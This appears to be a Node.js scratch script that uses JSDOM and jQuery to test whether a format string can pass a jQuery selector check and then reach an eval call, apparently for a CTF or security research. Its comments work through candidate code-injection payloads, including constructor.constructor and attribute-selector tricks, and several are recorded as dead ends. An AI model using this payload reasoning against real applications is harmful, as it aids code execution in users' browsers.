const fs = require("fs");
const { JSDOM } = require("jsdom");
const jq = fs.readFileSync(__dirname + "/jq371.js", "utf8");

function test(format) {
  const d = new JSDOM(
    `<form id="poly_x" data-formula="x"><input id="x_standard" name="x" value="1"><input id="y_standard" name="y" value="2"><input name="formula" value="x"><div id="template_standard"></div></form>`,
    { runScripts: "dangerously", pretendToBeVisual: true, url: "https://x/" });
  const w = d.window;
  const s = w.document.createElement("script"); s.textContent = jq; w.document.head.appendChild(s);
  const $ = w.$;
  const form = w.document.querySelector("form");
  form.id = "poly_" + format;
  const sel = form.id.replace("poly_", "");
  let r = { len: null, pwn: false };
  try {
    const T = $("#template_" + sel);
    r.len = T.length;
    if (T.length === 0) {
      w.__P__ = false;
      w.type_standard = function () { return 1; };
      try {
        w.eval("window.__run=function(selected){ return eval('type_'+selected+'(this, selected)'); }");
        w.__run.call(form, sel);
        r.pwn = !!w.__P__;
      } catch (e) { r.ev = e.message.split("\n")[0]; }
    }
  } catch (e) { r.se = e.message.split("\n")[0]; }
  return r;
}

// PAYLOAD idea: the free call is `F(this, selected)`.
// Choose F so that F(form, code) EXECUTES code.
// setTimeout signature (fn/code, delay) executes arg1! setTimeout("code", x) runs code.
//   -> if F === setTimeout, then setTimeout(form, selected) -> arg1=form (not a string/fn) -> nothing.
//   We need setTimeout(CODE, delay): but our arg1 is form. Dead.
// clearTimeout no.
// What about: F = eval ; eval(form, code) -> eval ignores 2nd arg, evaluates form.toString()="[object..]" -> no.
//   BUT if arg1 were code... arg1 is form. Dead.
//
// So arg1(form) is the poison. We must reach a fn where arg2 runs. There is essentially none builtin.
//
// THEREFORE: flip it — make the payload live in the FORM, not in `selected`.
//   `this` (form) is arg1. If F executes arg1... F=setTimeout(fn,..)/eval runs arg1 if arg1 is string/fn.
//   form is an element, not code. BUT we control form's attributes (id/data-formula) and even its
//   toString? No.
//   HOWEVER: getFormulaFromForm reads data-formula; and updateCurrentUrl sets data-formula = values.formula.
//   Not code exec.
//
// NEW WINNING IDEA: Function(selected) returns fn. We can't call it. BUT if `selected` is chosen so
//   that the *selector chain itself* invokes a getter... no.
//
// FINAL: Use `.constructor.constructor` but supply BOTH args as code via making arg1 valid.
//   Function(p1, body): p1 must be a valid param list. arg1=form. We cannot change it. DEAD end confirmed.
//
// So the intended solution must NOT go through the (this, selected) call as Function.
// Re-examine: maybe format="standard" branch? No.
// Maybe the selector CAN be made empty with format that yields a REAL alert-capable eval like
//   "constructor.constructor(alert(1))()" IF jQuery didn't parse it — but it does parse (throws).
//
// TEST: does jQuery accept the selector if it STARTS with a valid part then has junk after a comma
//   where junk is itself a valid selector? e.g. "x,y" grouping. "standard,*"?  -> then eval:
//   type_standard,*(this,selected) -> syntax error (*). 
// TEST grouping with a second valid selector that is also valid JS-ish:
// The RCE marker: we want window.__P__=true. Put it in `selected` (the format string) as a Function body.
// But format must ALSO be the CSS selector body. So the body chars must be CSS-valid... which breaks.
// UNLESS: the payload string is NOT in the selector-relevant part. Idea: format = "standard.CHAIN"
//   where CHAIN has no payload; the PAYLOAD comes from `this`(form) attributes we control.
// getSelectedFormatter uses id; but data-formula is attacker controlled and read elsewhere. Not exec.
//
// Realistic: the marker must be inside `selected`==format, so it IS in the selector. The only way the
// selector tolerates arbitrary code chars is if they're inside a pseudo like :not("...") or [attr="..."].
// jQuery attribute selector VALUES accept arbitrary chars inside quotes: #id[a="ANY CHARS"].
// And in JS, type_standard[a="ANY"] is: member access type_standard[ (a="ANY") ] = type_standard["ANY"].
//   That's valid JS! a="ANY" assigns global a, returns "ANY", used as computed member. No exec though.
// But we can chain: type_standard[a="..."].constructor... still need call.
// The free (this,selected) call then applies. So: type_standard[x="whatever"] then .call chain.
// Let's test attribute-selector bridge which allows arbitrary payload chars:
const cands = [
  'standard[a="b"]',                                   // does jQuery accept id+attr? valid+empty?
  'standard[a=b]',
  'standard.constructor.constructor.call',
];
for (const c of cands) console.log(JSON.stringify(c), "=>", JSON.stringify(test(c)));
